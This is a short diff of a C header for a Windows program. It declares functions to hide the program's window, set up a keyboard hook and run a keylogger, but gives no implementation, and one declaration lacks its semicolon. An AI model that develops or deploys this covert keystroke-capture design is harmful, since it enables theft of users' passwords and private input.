@@ -21,7 +21,16 @@
 #include <stdio.h>
 #include <windows.h>
 #include <errno.h>
+#include <winuser.h>
+#include <libloaderapi.h>
+#include <stdbool.h>
 
-void    hideWindow(void);
+
+/* Window */
+void    HideWindow(void);
+
+/* Key Hook */
+void    SetupKeyHook()
+bool    Keylogger();
 
 #endif
